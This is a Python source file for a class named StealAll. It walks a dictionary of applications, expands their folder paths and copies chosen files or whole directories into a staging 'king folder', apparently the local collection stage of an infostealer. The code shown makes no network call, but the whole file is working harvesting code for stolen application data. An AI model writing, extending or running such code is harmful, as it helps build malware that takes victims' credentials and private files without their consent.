import shutil
import os
from pathlib import Path

class StealAll:
    def __init__(self, king_folder_path: str, app_dict: dict) -> None:
            for software in app_dict["apps"]:
                if not software:
                    return None
                software_name = software["folders"]
                normalized_path = os.path.expandvars(software_name)
                if not os.path.exists(normalized_path):
                    continue
                software_files_dir: str = os.path.join(king_folder_path, "Applications", software["name"])
                os.makedirs(software_files_dir, exist_ok=True)
                if '*' not in software["files"]:
                    self.__copy_file__(normalized_path, software_files_dir, software["files"])
                else:
                    self.__copy_dir__(normalized_path, software_files_dir)

    # this function entract files not dir
    def __copy_file__(self, path: str, new_path: str, files: list[str]) -> None:
        for files_name in os.listdir(path):
            all_file_path: str = os.path.join(path, files_name)
            if Path(all_file_path).suffix.upper() in files or files_name.upper() in files:
                try:
                    shutil.copy2(all_file_path, os.path.join(new_path, files_name))
                except Exception as err:
                    print(err)
    
    # this function extract copy all dir
    def __copy_dir__(self, path: str, new_path: str) -> None:
        new_copy_dir_path = os.path.join(new_path, os.path.basename(path))

        try:
            shutil.copytree(path, new_copy_dir_path)
        except FileExistsError as err:
            print(err)
        except OSError as err:
            print(err)